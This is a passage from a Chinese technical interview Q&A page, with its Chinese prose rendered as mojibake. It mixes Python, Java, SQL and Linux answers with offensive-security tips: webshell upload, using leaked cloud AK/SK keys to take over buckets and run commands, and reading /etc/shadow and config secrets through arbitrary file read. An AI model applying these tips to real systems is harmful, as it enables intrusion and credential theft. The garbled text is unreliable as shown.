title="è·å–ç½‘ç«™ç»å¯¹è·¯å¾„çš„å››ç§æ–¹å¼"></a>è·å–ç½‘ç«™ç»å¯¹è·¯å¾„çš„å››ç§æ–¹å¼</h3><ol start="2"><li><strong>æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯</strong>ï¼šæœåŠ¡å™¨è¿”å›çš„é”™è¯¯ä¿¡æ¯å¯èƒ½åŒ…å«ç»å¯¹è·¯å¾„ã€‚</li><li><strong>PHPå‡½æ•°</strong>ï¼šå¦‚<code>__FILE__</code>ã€<code>dirname(__FILE__)</code>ç­‰ã€‚</li><li><strong>Webshell</strong>ï¼šé€šè¿‡ä¸Šä¼ Webshellè·å–æœåŠ¡å™¨ä¿¡æ¯ã€‚</li></ol><h3 id="å¦‚ä½•é˜²æ­¢SQLæ³¨å…¥ï¼Œå…·ä½“çš„å‡½æ•°"><a href="#å¦‚ä½•é˜²æ­¢SQLæ³¨å…¥ï¼Œå…·ä½“çš„å‡½æ•°" class="headerlink" title="å¦‚ä½•é˜²æ­¢SQLæ³¨å…¥ï¼Œå…·ä½“çš„å‡½æ•°"></a>å¦‚ä½•é˜²æ­¢SQLæ³¨å…¥ï¼Œå…·ä½“çš„å‡½æ•°</h3><p>åœ¨PHPä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>mysqli_real_escape_string()</code>å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰ã€‚æ­¤å¤–ï¼Œä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ä¹Ÿæ˜¯é˜²æ­¢SQLæ³¨å…¥çš„æœ‰æ•ˆæ–¹æ³•ã€‚</p><h3 id="SQLmapä¸­-TçŸ¥é“ä»€ä¹ˆæ„æ€å—ï¼Ÿ"><a href="#SQLmapä¸­-TçŸ¥é“ä»€ä¹ˆæ„æ€å—ï¼Ÿ" class="headerlink" title="SQLmapä¸­-TçŸ¥é“ä»€ä¹ˆæ„æ€å—ï¼Ÿ"></a>SQLmapä¸­-TçŸ¥é“ä»€ä¹ˆæ„æ€å—ï¼Ÿ</h3><p>åœ¨SQLmapä¸­ï¼Œ<code>-T</code>å‚æ•°ç”¨äºæŒ‡å®šè¦æµ‹è¯•çš„æ•°æ®åº“è¡¨åã€‚</p><h3 id="Pythonåˆ—è¡¨æ¨å¯¼"><a href="#Pythonåˆ—è¡¨æ¨å¯¼" class="headerlink" title="Pythonåˆ—è¡¨æ¨å¯¼"></a>Pythonåˆ—è¡¨æ¨å¯¼</h3><p>åˆ—è¡¨æ¨å¯¼æ˜¯ä¸€ç§ç®€æ´çš„åˆ›å»ºåˆ—è¡¨çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">squares = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦æœ‰æŸç§å±æ€§"><a href="#åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦æœ‰æŸç§å±æ€§" class="headerlink" title="åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦æœ‰æŸç§å±æ€§"></a>åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦æœ‰æŸç§å±æ€§</h3><p>å¯ä»¥ä½¿ç”¨<code>hasattr()</code>å‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.my_attribute = <span class="number">42</span></span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(obj, <span class="string">&#x27;my_attribute&#x27;</span>))  <span class="comment"># è¾“å‡º: True</span></span><br></pre></td></tr></table></figure><h3 id="init-å’Œ-new"><a href="#init-å’Œ-new" class="headerlink" title="init å’Œ new"></a><strong>init</strong> å’Œ <strong>new</strong></h3><ul><li><code>__new__</code>ï¼šæ˜¯ç±»çš„æ„é€ æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºç±»çš„å®ä¾‹ã€‚</li><li><code>__init__</code>ï¼šæ˜¯ç±»çš„åˆå§‹åŒ–æ–¹æ³•ï¼Œç”¨äºåˆå§‹åŒ–ç±»çš„å®ä¾‹ã€‚</li></ul><h3 id="è£…é¥°å™¨åº”ç”¨åœºæ™¯"><a href="#è£…é¥°å™¨åº”ç”¨åœºæ™¯" class="headerlink" title="è£…é¥°å™¨åº”ç”¨åœºæ™¯"></a>è£…é¥°å™¨åº”ç”¨åœºæ™¯</h3><p>è£…é¥°å™¨ç”¨äºåœ¨ä¸ä¿®æ”¹å‡½æ•°æœ¬èº«çš„æƒ…å†µä¸‹ï¼Œå¢åŠ å‡½æ•°çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œæ—¥å¿—è®°å½•ã€æƒé™éªŒè¯ç­‰ã€‚</p><h3 id="é™æ€æ–¹æ³•-staticmethod"><a href="#é™æ€æ–¹æ³•-staticmethod" class="headerlink" title="é™æ€æ–¹æ³• staticmethod"></a>é™æ€æ–¹æ³• staticmethod</h3><p>é™æ€æ–¹æ³•æ˜¯å±äºç±»çš„æ–¹æ³•ï¼Œä½†ä¸éœ€è¦è®¿é—®ç±»çš„ç‰¹å®šå®ä¾‹ã€‚å¯ä»¥ä½¿ç”¨<code>@staticmethod</code>è£…é¥°å™¨å®šä¹‰ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_static_method</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is a static method.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="å·²çŸ¥æŸç«¯å£ï¼ŒæŸ¥çœ‹å ç”¨å®ƒçš„è¿›ç¨‹å·"><a href="#å·²çŸ¥æŸç«¯å£ï¼ŒæŸ¥çœ‹å ç”¨å®ƒçš„è¿›ç¨‹å·" class="headerlink" title="å·²çŸ¥æŸç«¯å£ï¼ŒæŸ¥çœ‹å ç”¨å®ƒçš„è¿›ç¨‹å·"></a>å·²çŸ¥æŸç«¯å£ï¼ŒæŸ¥çœ‹å ç”¨å®ƒçš„è¿›ç¨‹å·</h3><p>å¯ä»¥ä½¿ç”¨<code>netstat</code>å‘½ä»¤ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep :80</span><br></pre></td></tr></table></figure><h3 id="å·²çŸ¥æŸä¸ª-a-py-è¿›ç¨‹è·‘ç€ï¼ŒæŸ¥çœ‹å…¶ç«¯å£"><a href="#å·²çŸ¥æŸä¸ª-a-py-è¿›ç¨‹è·‘ç€ï¼ŒæŸ¥çœ‹å…¶ç«¯å£" class="headerlink" title="å·²çŸ¥æŸä¸ª a.py è¿›ç¨‹è·‘ç€ï¼ŒæŸ¥çœ‹å…¶ç«¯å£"></a>å·²çŸ¥æŸä¸ª a.py è¿›ç¨‹è·‘ç€ï¼ŒæŸ¥çœ‹å…¶ç«¯å£</h3><p>å¯ä»¥ä½¿ç”¨<code>lsof</code>å‘½ä»¤ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :80 | grep a.py</span><br></pre></td></tr></table></figure><h3 id="æ€æ­»æœºå™¨æ‰€æœ‰-python-è¿›ç¨‹ã€"><a href="#æ€æ­»æœºå™¨æ‰€æœ‰-python-è¿›ç¨‹ã€" class="headerlink" title="æ€æ­»æœºå™¨æ‰€æœ‰ python è¿›ç¨‹ã€"></a>æ€æ­»æœºå™¨æ‰€æœ‰ python è¿›ç¨‹ã€</h3><p>å¯ä»¥ä½¿ç”¨<code>pkill</code>å‘½ä»¤ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -f python</span><br></pre></td></tr></table></figure><h3 id="MongoDB-å’Œ-MySQL"><a href="#MongoDB-å’Œ-MySQL" class="headerlink" title="MongoDB å’Œ MySQL"></a>MongoDB å’Œ MySQL</h3><p><strong>MongoDB</strong>ï¼š</p><ul><li><strong>æ•°æ®æ¨¡å‹</strong>ï¼šMongoDB æ˜¯ä¸€ä¸ªæ–‡æ¡£å‹æ•°æ®åº“ï¼Œä½¿ç”¨ BSONï¼ˆBinary JSONï¼‰æ ¼å¼å­˜å‚¨æ•°æ®ã€‚æ•°æ®ä»¥æ–‡æ¡£çš„å½¢å¼ç»„ç»‡ï¼Œæ–‡æ¡£å¯ä»¥åµŒå¥—ï¼Œæ”¯æŒå¤æ‚çš„æ•°æ®ç»“æ„ã€‚</li><li><strong>schemaçµæ´»æ€§</strong>ï¼šMongoDB çš„ schema æ˜¯åŠ¨æ€çš„ï¼Œå¯ä»¥åœ¨æ’å…¥æ•°æ®æ—¶å®šä¹‰å­—æ®µï¼Œæ— éœ€é¢„å…ˆå®šä¹‰è¡¨ç»“æ„ã€‚</li><li><strong>æ‰©å±•æ€§</strong>ï¼šMongoDB æ”¯æŒæ°´å¹³æ‰©å±•ï¼Œé€šè¿‡åˆ†ç‰‡ï¼ˆshardingï¼‰å¯ä»¥å°†æ•°æ®åˆ†å¸ƒåœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šï¼Œé€‚åˆå¤„ç†å¤§è§„æ¨¡æ•°æ®ã€‚</li></ul><p><strong>MySQL</strong>ï¼š</p><ul><li><strong>æ•°æ®æ¨¡å‹</strong>ï¼šMySQL æ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ï¼Œæ•°æ®ä»¥è¡¨æ ¼çš„å½¢å¼å­˜å‚¨ï¼Œè¡¨ä¸è¡¨ä¹‹é—´é€šè¿‡å…³ç³»è¿æ¥ã€‚</li><li><strong>schemaå®šä¹‰</strong>ï¼šMySQL çš„ schema æ˜¯é™æ€çš„ï¼Œéœ€è¦é¢„å…ˆå®šä¹‰è¡¨ç»“æ„å’Œå­—æ®µç±»å‹ã€‚</li><li><strong>æ‰©å±•æ€§</strong>ï¼šMySQL æ”¯æŒå‚ç›´æ‰©å±•ï¼Œé€šè¿‡å¢åŠ æœåŠ¡å™¨çš„ç¡¬ä»¶èµ„æºæ¥æå‡æ€§èƒ½ï¼Œä¹Ÿæ”¯æŒä¸»ä»å¤åˆ¶ç­‰é«˜å¯ç”¨æ–¹æ¡ˆã€‚</li></ul><h3 id="INNER-JOIN-LEFT-JOIN-RIGHT-JOIN"><a href="#INNER-JOIN-LEFT-JOIN-RIGHT-JOIN" class="headerlink" title="INNER JOIN, LEFT JOIN, RIGHT JOIN"></a>INNER JOIN, LEFT JOIN, RIGHT JOIN</h3><ul><li><strong>INNER JOIN</strong>ï¼šè¿”å›ä¸¤ä¸ªè¡¨ä¸­åŒ¹é…çš„è¡Œã€‚è¯­æ³•ï¼š<code>SELECT columns FROM table1 INNER JOIN table2 ON table1.column = table2.column;</code></li><li><strong>LEFT JOIN</strong>ï¼šè¿”å›å·¦è¡¨ä¸­çš„æ‰€æœ‰è¡Œï¼Œä»¥åŠå³è¡¨ä¸­åŒ¹é…çš„è¡Œã€‚å¦‚æœå³è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œåˆ™è¿”å› NULLã€‚è¯­æ³•ï¼š<code>SELECT columns FROM table1 LEFT JOIN table2 ON table1.column = table2.column;</code></li><li><strong>RIGHT JOIN</strong>ï¼šè¿”å›å³è¡¨ä¸­çš„æ‰€æœ‰è¡Œï¼Œä»¥åŠå·¦è¡¨ä¸­åŒ¹é…çš„è¡Œã€‚å¦‚æœå·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œåˆ™è¿”å› NULLã€‚è¯­æ³•ï¼š<code>SELECT columns FROM table1 RIGHT JOIN table2 ON table1.column = table2.column;</code></li></ul><h3 id="å­æŸ¥è¯¢"><a href="#å­æŸ¥è¯¢" class="headerlink" title="å­æŸ¥è¯¢"></a>å­æŸ¥è¯¢</h3><p>å­æŸ¥è¯¢æ˜¯æŒ‡åœ¨ä¸€ä¸ªæŸ¥è¯¢è¯­å¥å†…éƒ¨åµŒå¥—å¦ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 <span class="keyword">WHERE</span> column1 <span class="keyword">IN</span> (<span class="keyword">SELECT</span> column2 <span class="keyword">FROM</span> table2 <span class="keyword">WHERE</span> <span class="keyword">condition</span>);</span><br></pre></td></tr></table></figure><h3 id="IP-åœ°å€å‡ºç°æ¬¡æ•°çš„ç»Ÿè®¡"><a href="#IP-åœ°å€å‡ºç°æ¬¡æ•°çš„ç»Ÿè®¡" class="headerlink" title="IP åœ°å€å‡ºç°æ¬¡æ•°çš„ç»Ÿè®¡"></a>IP åœ°å€å‡ºç°æ¬¡æ•°çš„ç»Ÿè®¡</h3><p>å‡è®¾æœ‰ä¸€ä¸ªè¡¨ <code>ip_logs</code>ï¼Œå…¶ä¸­åŒ…å« <code>ip_address</code> å­—æ®µï¼Œè¦ç»Ÿè®¡æ¯ä¸ª IP åœ°å€å‡ºç°çš„æ¬¡æ•°å¹¶æŒ‰é™åºæ’åˆ—ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ip_address, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> occurrence</span><br><span class="line"><span class="keyword">FROM</span> ip_logs</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ip_address</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> occurrence <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><h3 id="å·¥å‚æ¨¡å¼"><a href="#å·¥å‚æ¨¡å¼" class="headerlink" title="å·¥å‚æ¨¡å¼"></a>å·¥å‚æ¨¡å¼</h3><p>å·¥å‚æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡è€Œä¸æš´éœ²åˆ›å»ºé€»è¾‘ã€‚å·¥å‚æ¨¡å¼çš„æ ¸å¿ƒæ˜¯å®šä¹‰ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œç”±å­ç±»å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªç±»ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Draw a circle.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Draw a rectangle.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String shapeType)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (shapeType.equalsIgnoreCase(<span class="string">&quot;CIRCLE&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shapeType.equalsIgnoreCase(<span class="string">&quot;RECTANGLE&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Java-å¦‚ä½•ä¿è¯çº¿ç¨‹å®‰å…¨"><a href="#Java-å¦‚ä½•ä¿è¯çº¿ç¨‹å®‰å…¨" class="headerlink" title="Java å¦‚ä½•ä¿è¯çº¿ç¨‹å®‰å…¨"></a>Java å¦‚ä½•ä¿è¯çº¿ç¨‹å®‰å…¨</h3><p>Java ä¸­ä¿è¯çº¿ç¨‹å®‰å…¨çš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li><strong>åŒæ­¥æœºåˆ¶</strong>ï¼šä½¿ç”¨ <code>synchronized</code> å…³é”®å­—æˆ– <code>ReentrantLock</code> ç­‰æ˜¾å¼é”ã€‚</li><li><strong>ä¸å¯å˜å¯¹è±¡</strong>ï¼šåˆ›å»ºä¸å¯å˜å¯¹è±¡ï¼Œç¡®ä¿å¯¹è±¡çš„çŠ¶æ€ä¸ä¼šè¢«ä¿®æ”¹ã€‚</li><li><strong>çº¿ç¨‹å®‰å…¨çš„ç±»</strong>ï¼šä½¿ç”¨çº¿ç¨‹å®‰å…¨çš„é›†åˆç±»ï¼Œå¦‚ <code>ConcurrentHashMap</code>ã€‚</li></ul><h3 id="CPU-å ç”¨è¿‡é«˜ä½†ç»“æœè¿”å›å¾ˆæ…¢çš„åŸå› åŠè§£å†³"><a href="#CPU-å ç”¨è¿‡é«˜ä½†ç»“æœè¿”å›å¾ˆæ…¢çš„åŸå› åŠè§£å†³" class="headerlink" title="CPU å ç”¨è¿‡é«˜ä½†ç»“æœè¿”å›å¾ˆæ…¢çš„åŸå› åŠè§£å†³"></a>CPU å ç”¨è¿‡é«˜ä½†ç»“æœè¿”å›å¾ˆæ…¢çš„åŸå› åŠè§£å†³</h3><ul><li><strong>åŸå› </strong>ï¼šå¯èƒ½æ˜¯ç”±äºç®—æ³•æ•ˆç‡ä½ã€æ­»é”ã€èµ„æºç«äº‰ç­‰é—®é¢˜å¯¼è‡´ CPU å ç”¨é«˜ä½†å“åº”æ…¢ã€‚</li><li><strong>è§£å†³</strong>ï¼šä¼˜åŒ–ç®—æ³•ã€æ£€æŸ¥å¹¶è§£å†³æ­»é”é—®é¢˜ã€åˆç†ç®¡ç†èµ„æºã€‚</li></ul><h3 id="å†…å­˜å ç”¨è¿‡é«˜çš„åŸå› åŠè§£å†³"><a href="#å†…å­˜å ç”¨è¿‡é«˜çš„åŸå› åŠè§£å†³" class="headerlink" title="å†…å­˜å ç”¨è¿‡é«˜çš„åŸå› åŠè§£å†³"></a>å†…å­˜å ç”¨è¿‡é«˜çš„åŸå› åŠè§£å†³</h3><ul><li><strong>åŸå› </strong>ï¼šå¯èƒ½æ˜¯å†…å­˜æ³„æ¼ã€å¤§å¯¹è±¡åˆ†é…ã€é¢‘ç¹çš„åƒåœ¾å›æ”¶ç­‰é—®é¢˜ã€‚</li><li><strong>è§£å†³</strong>ï¼šä½¿ç”¨å†…å­˜åˆ†æå·¥å…·æŸ¥æ‰¾å†…å­˜æ³„æ¼ã€ä¼˜åŒ–å¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯ã€è°ƒæ•´ JVM å‚æ•°ã€‚</li></ul><h3 id="çº¿ç¨‹æ± çº¿ç¨‹æ•°é‡çš„è®¾ç½®"><a href="#çº¿ç¨‹æ± çº¿ç¨‹æ•°é‡çš„è®¾ç½®" class="headerlink" title="çº¿ç¨‹æ± çº¿ç¨‹æ•°é‡çš„è®¾ç½®"></a>çº¿ç¨‹æ± çº¿ç¨‹æ•°é‡çš„è®¾ç½®</h3><p>çº¿ç¨‹æ± çš„çº¿ç¨‹æ•°é‡åº”æ ¹æ®ä»»åŠ¡çš„æ€§è´¨å’Œç³»ç»Ÿçš„èµ„æºæ¥è®¾ç½®ã€‚å¯¹äº CPU å¯†é›†å‹ä»»åŠ¡ï¼Œçº¿ç¨‹æ•°é‡å¯ä»¥è®¾ç½®ä¸º CPU æ ¸å¿ƒæ•°åŠ ä¸€ï¼›å¯¹äº I&#x2F;O å¯†é›†å‹ä»»åŠ¡ï¼Œå¯ä»¥è®¾ç½®æ›´å¤šçš„çº¿ç¨‹ã€‚çº¿ç¨‹è¿‡å¤šå¯èƒ½å¯¼è‡´èµ„æºè€—å°½å’Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ï¼Œçº¿ç¨‹è¿‡å°‘å¯èƒ½å¯¼è‡´ä»»åŠ¡æ’é˜Ÿç­‰å¾…æ—¶é—´è¿‡é•¿ã€‚</p><h3 id="äº‘AK-SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡"><a href="#äº‘AK-SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡" class="headerlink" title="äº‘AK&#x2F;SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡"></a>äº‘AK&#x2F;SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡</h3><p><strong>åˆ©ç”¨</strong>ï¼š</p><ul><li><strong>å­˜å‚¨æ¡¶æ¥ç®¡</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚OSS Browseræˆ–è¡Œäº‘ç®¡å®¶ï¼Œé€šè¿‡AK&#x2F;SKç™»å½•äº‘å­˜å‚¨æœåŠ¡ï¼Œæ¥ç®¡å­˜å‚¨æ¡¶ï¼Œè¿›è¡ŒæŸ¥çœ‹ã€ä¸Šä¼ ã€ç¼–è¾‘ã€åˆ é™¤ç­‰æ“ä½œã€‚</li><li><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šåˆ©ç”¨AK&#x2F;SKé€šè¿‡äº‘ç®¡ç†å¹³å°æˆ–å·¥å…·ï¼ˆå¦‚CFæ¡†æ¶ï¼‰å¯¹äº‘ä¸»æœºè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</li><li><strong>èµ„æºè®¿é—®</strong>ï¼šä½¿ç”¨AK&#x2F;SKè®¿é—®å’Œæ“ä½œäº‘ä¸Šçš„å…¶ä»–èµ„æºï¼Œå¦‚æ•°æ®åº“ã€æœåŠ¡å™¨ç­‰ã€‚</li></ul><p><strong>é˜²å¾¡</strong>ï¼š</p><ul><li><strong>å®šæœŸæ›´æ¢AK&#x2F;SK</strong>ï¼šé™ä½é•¿æœŸä½¿ç”¨åŒä¸€ç»„AK&#x2F;SKå¯¼è‡´æ³„éœ²çš„é£é™©ã€‚</li><li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸ºä¸åŒä¸šåŠ¡åˆ†é…ä¸åŒå­è´¦æˆ·çš„AK&#x2F;SKï¼Œé™åˆ¶æƒé™ã€‚</li><li><strong>å¤šå› ç´ è®¤è¯</strong>ï¼šå¼€å¯ä¸»è´¦å·å¤šå› ç´ è®¤è¯ï¼Œé™ä½å› å¯†ç æ³„æ¼å¯¼è‡´çš„æœªæˆæƒè®¿é—®ã€‚</li><li><strong>å®‰å…¨å­˜å‚¨</strong>ï¼šå°†AK&#x2F;SKå­˜å‚¨åœ¨å®‰å…¨çš„å¯†é’¥ç®¡ç†ç³»ç»Ÿä¸­ï¼Œé¿å…åµŒå…¥ä»£ç æˆ–é…ç½®æ–‡ä»¶ã€‚</li></ul><h3 id="åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼"><a href="#åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼" class="headerlink" title="åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼"></a>åœ¨åªæœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„æƒ…å†µä¸‹æœ‰ä»€ä¹ˆåˆ©ç”¨æ–¹å¼</h3><ul><li><strong>è¯»å–æ•æ„Ÿæ–‡ä»¶</strong>ï¼šè¯»å–å¦‚<code>/etc/passwd</code>ã€<code>/etc/shadow</code>ç­‰æ–‡ä»¶è·å–ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯ã€‚</li><li><strong>è·å–é…ç½®ä¿¡æ¯</strong>ï¼šè¯»å–é…ç½®æ–‡ä»¶è·å–æ•°æ®åº“è¿æ¥ä¿¡æ¯ã€APIå¯†é’¥ç­‰æ•æ„Ÿæ•°æ®ã€‚</li><li><strong>å†…ç½‘ä¿¡æ¯æ”¶é›†</strong>ï¼šè¯»å–ç½‘ç»œé…ç½®æ–‡ä»¶è·å–å†…ç½‘ç»“æ„å’ŒIPåœ°å€æ®µã€‚</li><li><strong>å‘ç°å…¶ä»–æ¼æ´</strong>ï¼šé€šè¿‡è¯»å–æ—¥å¿—æ–‡ä»¶ç­‰å‘ç°å…¶ä»–æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</li></ul><h3 id="æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ-proc-pid-cmdlineï¼‰"><a href="#æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ-proc-pid-cmdlineï¼‰" class="headerlink" title="æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ/proc/pid/cmdlineï¼‰"></a>æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ<code>/proc/pid/cmdline</code>ï¼‰</h3><p>é€šè¿‡è¯»å–<code>/proc</code>ç›®å½•ä¸‹çš„æ–‡ä»¶å¯ä»¥è·å–ç³»ç»Ÿä¸­è¿è¡Œçš„è¿›ç¨‹å’ŒæœåŠ¡ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œ<code>/proc/pid/cmdline</code>æ–‡ä»¶åŒ…å«äº†è¿›ç¨‹å¯åŠ¨æ—¶çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œé€šè¿‡è¯»å–è¯¥æ–‡ä»¶å¯ä»¥äº†è§£æŸä¸ªè¿›ç¨‹å¯åŠ¨äº†å“ªäº›æœåŠ¡ã€‚</p><h3 id="æ€ä¹ˆæ‰¾é…ç½®æ–‡ä»¶"><a href="#æ€ä¹ˆæ‰¾é…ç½®æ–‡ä»¶" class="headerlink" title="æ€ä¹ˆæ‰¾é…ç½®æ–‡ä»¶"></a>æ€ä¹ˆæ‰¾é…ç½®æ–‡ä»¶</h3><ul><li><strong>å¸¸è§è·¯å¾„</strong>ï¼šæ£€æŸ¥å¸¸è§çš„é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œå¦‚<code>/etc/</code>ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</li><li><strong>æ–‡ä»¶æœç´¢å‘½ä»¤</strong>ï¼šä½¿ç”¨<code>find</code>æˆ–<code>locate</code>å‘½ä»¤æœç´¢åŒ…å«ç‰¹å®šå…³é”®è¯çš„é…ç½®æ–‡ä»¶ã€‚</li><li><strong>æœåŠ¡ç›¸å…³è·¯å¾„</strong>ï¼šæ ¹æ®è¿è¡Œçš„æœåŠ¡æŸ¥æ‰¾å¯¹åº”çš„é…ç½®æ–‡ä»¶è·¯å¾„ã€‚</li></ul><h3 